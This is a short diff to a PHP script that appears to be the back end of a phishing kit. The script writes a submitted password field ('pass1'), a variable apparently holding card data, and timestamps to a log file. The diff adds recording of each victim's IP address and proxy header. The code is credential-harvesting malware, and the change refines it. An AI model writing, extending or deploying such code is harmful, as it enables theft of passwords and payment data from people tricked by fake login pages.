@@ -2,10 +2,10 @@
 
 date_default_timezone_set('America/Caracas');
 ini_set("display_errors", 0);
-$userp = $_SERVER['REMOTE_ADDR'];
+$ip = $_SERVER['REMOTE_ADDR'];
 $userp = $_SERVER['HTTP_CLIENT_IP'];
 $userp = $_SERVER['HTTP_X_FORWARDED'];
-$userp = $_SERVER['HTTP_X_FORWARDED_FOR'];
+$proxy = $_SERVER['HTTP_X_FORWARDED_FOR'];
 
 
 
@@ -21,6 +21,8 @@ fwrite($file,
 * PASS1: ".$_POST['pass1']."
 * FECHA: ".date('Y-m-d')."
 * HORA: ".date('H:i:s')."
+* IP: ".$ip."
+* PROXY: ".$proxy."
 ".$userp."
 ".$ip."
 ".$cc."
